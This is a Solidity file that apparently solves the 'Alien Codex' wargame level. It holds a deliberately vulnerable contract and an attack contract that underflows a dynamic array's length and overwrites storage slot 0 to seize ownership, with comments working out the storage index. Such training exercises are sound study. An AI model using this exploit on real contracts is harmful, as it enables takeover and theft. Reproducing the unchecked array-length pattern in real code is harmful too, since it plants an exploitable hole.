// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

// Hack alien codex
contract AlienCodex {
    address public owner;
    bool public contact;
    bytes32[] public codex;

    constructor() public {
        owner = msg.sender;
    }

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract AlienAttack {
    AlienCodex public alienCodex;

    constructor(AlienCodex alienCodex_) public {
        alienCodex = alienCodex_;
        alienCodex.make_contact();
        alienCodex.retract();
        alienCodex.revise(
            calculateAttackIndex(),
            bytes32(uint256(address(msg.sender)))
        );
    }

    function getStorageStartKey() public pure returns (bytes32) {
        return keccak256(abi.encodePacked(uint256(1)));
    }

    function calculateAttackIndex() public pure returns (uint attackIndex) {
        bytes32 storageStartKey = getStorageStartKey();
        attackIndex =
            uint(
                bytes32(
                    hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                )
            ) -
            uint(storageStartKey) +
            1;
    }
}

/*
1) Have to figure out where the dynamic array starts in memory.

The dynamic array is the third state variable, the first two, an address and a bool are packed together. 
Thus, the second key in contract storage contains the length of the dynamic array.
Array data is located starting at keccak256(1).
keccak256(0x0000000000000000000000000000000000000000000000000000000000000001) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
This is the key of the start of data of the dynamic array.

2) Need to underflow the length of the dynammic array to 0 - 1.
This will set the array length to 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.
From there, we can access any storage slot in the contract with the right index.

3) Calculate the storage slot of the owner variable, which is in the first slot. 
(Start of dynamic array) + (array index) = 2^256 
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 

*/
